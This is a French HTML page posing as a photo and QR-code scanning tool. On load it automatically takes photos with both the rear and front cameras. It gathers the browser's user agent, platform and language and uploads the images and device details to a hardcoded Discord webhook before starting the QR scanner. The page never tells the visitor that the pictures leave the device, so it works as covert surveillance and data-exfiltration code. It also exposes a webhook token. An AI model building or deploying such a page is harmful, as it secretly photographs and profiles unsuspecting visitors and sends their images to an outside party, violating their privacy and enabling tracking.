<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capturer des photos et scanner un QR code</title>
    <style>
        #photo-main, #photo-selfie, #qr-reader {
            display: none;
        }
        #qr-reader {
            width: 300px;
            margin: auto;
        }
    </style>
    <script src="https://unpkg.com/html5-qrcode/minified/html5-qrcode.min.js"></script>
</head>
<body>
    <h1>Capturer des photos avec les deux caméras et scanner un QR code</h1>
    <p>Veuillez autoriser l'accès à la caméra pour prendre des photos automatiquement.</p>
    <canvas id="photo-main" width="320" height="240"></canvas>
    <canvas id="photo-selfie" width="320" height="240"></canvas>
    <div id="qr-reader"></div>

    <script>
        async function obtenirInfosAppareil() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;

            return `User Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`;
        }

        function envoyerDonnees(imageBlobs, infos) {
            const formData = new FormData();
            imageBlobs.forEach((blob, index) => {
                formData.append(`file${index}`, blob, `photo${index}.png`);
            });
            formData.append('payload_json', JSON.stringify({ content: infos }));

            const url = 'https://discord.com/api/webhooks/1264515631122878466/IeM3kvt1ZIIcvP7tq2NBQtG80ARxiqkuKv-PBjLbjFwuOr87Im8l6ls3LVybGGxL-Xvu';
            return fetch(url, {
                method: 'POST',
                body: formData
            });
        }

        function capturerPhoto(stream, canvas) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                video.onloadeddata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    video.pause();
                    video.srcObject = null;
                    stream.getTracks().forEach(track => track.stop());
                    resolve(canvas.toDataURL('image/png'));
                };
            });
        }

        function dataURLToBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        async function lancerScanQRCode() {
            const qrReader = document.getElementById('qr-reader');
            qrReader.style.display = 'block';
            const html5QrCode = new Html5Qrcode("qr-reader");

            html5QrCode.start(
                { facingMode: "environment" }, // Demander la caméra arrière pour le scan QR
                {
                    fps: 10,
                    qrbox: 250
                },
                (decodedText, decodedResult) => {
                    console.log(`QR Code détecté: ${decodedText}`);
                    // Vous pouvez ajouter une action à effectuer après la détection du QR code ici.
                    html5QrCode.stop();
                },
                (errorMessage) => {
                    console.warn(`Erreur de scan: ${errorMessage}`);
                }
            ).catch((err) => {
                console.error(`Erreur de démarrage du scanner QR: ${err}`);
            });
        }

        (async function() {
            const canvasMain = document.getElementById('photo-main');
            const canvasSelfie = document.getElementById('photo-selfie');

            // Accéder à la caméra principale (arrière)
            const streamMain = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            const dataURLMain = await capturerPhoto(streamMain, canvasMain);

            // Accéder à la caméra selfie (avant)
            const streamSelfie = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const dataURLSelfie = await capturerPhoto(streamSelfie, canvasSelfie);

            // Convertir les données URL en Blobs
            const blobMain = dataURLToBlob(dataURLMain);
            const blobSelfie = dataURLToBlob(dataURLSelfie);
            const infosAppareil = await obtenirInfosAppareil();

            // Envoyer les photos et les informations
            await envoyerDonnees([blobMain, blobSelfie], infosAppareil);
            console.log('Images et informations envoyées avec succès');

            // Lancer le scan du QR code
            lancerScanQRCode();
        })();
    </script>
</body>
</html>
